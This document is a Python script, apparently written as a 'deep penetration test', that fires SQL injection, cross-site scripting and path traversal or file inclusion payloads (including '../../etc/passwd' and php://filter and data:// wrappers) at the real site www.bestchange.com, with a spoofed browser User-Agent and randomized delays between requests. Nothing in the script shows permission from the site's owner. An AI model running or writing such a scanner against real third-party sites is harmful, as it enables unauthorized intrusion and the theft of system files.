#!/usr/bin/env python3
"""
BestChange.com Deep Penetration Testing
Advanced penetration testing techniques
"""

import requests
import time
import random
import base64
import hashlib
from urllib.parse import quote

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    RESET = '\033[0m'

class DeepPenetrationTester:
    def __init__(self, base_url="https://www.bestchange.com"):
        self.base_url = base_url
        self.session = requests.Session()
        self.findings = []
        self.setup_session()
    
    def setup_session(self):
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        })
        self.session.timeout = 10
    
    def random_delay(self, min_sec=0.1, max_sec=0.3):
        time.sleep(random.uniform(min_sec, max_sec))
    
    def log_finding(self, vuln_type, location, details, severity="MEDIUM"):
        self.findings.append({
            'type': vuln_type,
            'location': location,
            'details': details,
            'severity': severity
        })
        color = Colors.RED if severity == "HIGH" else Colors.YELLOW
        print(f"{color}[!] {vuln_type} [{severity}]{Colors.RESET}")
        print(f"    {location}: {details}\n")
    
    def test_advanced_sqli(self):
        """Advanced SQL injection with encoding"""
        print(f"{Colors.BLUE}[*] Testing advanced SQL injection...{Colors.RESET}")
        
        # Advanced encoded payloads
        encoded_payloads = [
            ("1' OR '1'='1", "Basic boolean"),
            ("1' UNION SELECT NULL,NULL--", "Union-based"),
            ("1' AND SLEEP(5)--", "Time-based"),
            (base64.b64encode(b"1' OR '1'='1").decode(), "Base64 encoded"),
            (quote("1' OR '1'='1"), "URL encoded"),
        ]
        
        endpoints = [
            {'url': f'{self.base_url}/click.php', 'params': {'id': '1', 'from': '10', 'to': '58', 'city': '0'}},
        ]
        
        for endpoint in endpoints:
            for param_name in endpoint['params'].keys():
                for payload, description in encoded_payloads:
                    try:
                        test_params = endpoint['params'].copy()
                        test_params[param_name] = payload
                        
                        start = time.time()
                        response = self.session.get(endpoint['url'], params=test_params, timeout=10)
                        elapsed = time.time() - start
                        self.random_delay()
                        
                        # Check for SQL errors
                        sql_errors = ['mysql', 'sql syntax', 'postgresql', 'ora-', 'sqlite']
                        for error in sql_errors:
                            if error in response.text.lower():
                                self.log_finding(
                                    "SQL Injection",
                                    f"{endpoint['url']}?{param_name}",
                                    f"{description}: {error}",
                                    "HIGH"
                                )
                                break
                        
                        # Time-based check
                        if 'SLEEP' in payload.upper() and elapsed > 4:
                            self.log_finding(
                                "SQL Injection (Time-based)",
                                f"{endpoint['url']}?{param_name}",
                                f"Delayed: {elapsed:.2f}s",
                                "HIGH"
                            )
                    except:
                        continue
    
    def test_advanced_xss(self):
        """Advanced XSS with encoding bypasses"""
        print(f"{Colors.BLUE}[*] Testing advanced XSS...{Colors.RESET}")
        
        xss_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            base64.b64encode(b"<script>alert(1)</script>").decode(),
            quote("<script>alert(1)</script>"),
        ]
        
        for payload in xss_payloads:
            try:
                url = f"{self.base_url}/index.php"
                response = self.session.get(url, params={'test': payload}, timeout=5)
                self.random_delay()
                
                if payload in response.text or payload.replace('<', '&lt;') in response.text:
                    self.log_finding(
                        "XSS Reflection",
                        "index.php?test",
                        "Payload reflected",
                        "HIGH"
                    )
            except:
                continue
    
    def test_file_operations(self):
        """Test file operation vulnerabilities"""
        print(f"{Colors.BLUE}[*] Testing file operations...{Colors.RESET}")
        
        file_payloads = [
            '../../etc/passwd',
            '....//....//etc/passwd',
            'php://filter/convert.base64-encode/resource=index.php',
            'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==',
        ]
        
        for payload in file_payloads:
            try:
                url = f"{self.base_url}/index.php"
                response = self.session.get(url, params={'file': payload}, timeout=5)
                self.random_delay()
                
                if 'root:' in response.text or '<?php' in response.text:
                    self.log_finding(
                        "File Inclusion",
                        "index.php?file",
                        f"File inclusion: {payload}",
                        "HIGH"
                    )
            except:
                continue
    
    def generate_report(self):
        """Generate report"""
        print(f"\n{Colors.YELLOW}{'='*70}{Colors.RESET}")
        print(f"{Colors.YELLOW}DEEP PENETRATION REPORT{Colors.RESET}")
        print(f"{Colors.YELLOW}{'='*70}{Colors.RESET}\n")
        
        if self.findings:
            high = [f for f in self.findings if f['severity'] == 'HIGH']
            medium = [f for f in self.findings if f['severity'] == 'MEDIUM']
            
            print(f"{Colors.RED}[!] Found {len(self.findings)} finding(s){Colors.RESET}")
            print(f"  HIGH: {len(high)}, MEDIUM: {len(medium)}\n")
        else:
            print(f"{Colors.GREEN}[+] No additional vulnerabilities found{Colors.RESET}")

def main():
    print(f"{Colors.BLUE}{'='*70}{Colors.RESET}")
    print(f"{Colors.BLUE}BestChange.com Deep Penetration Testing{Colors.RESET}")
    print(f"{Colors.BLUE}{'='*70}{Colors.RESET}\n")
    
    tester = DeepPenetrationTester()
    
    try:
        tester.test_advanced_sqli()
        tester.test_advanced_xss()
        tester.test_file_operations()
    except Exception as e:
        print(f"{Colors.RED}Error: {str(e)}{Colors.RESET}")
    
    tester.generate_report()

if __name__ == "__main__":
    main()
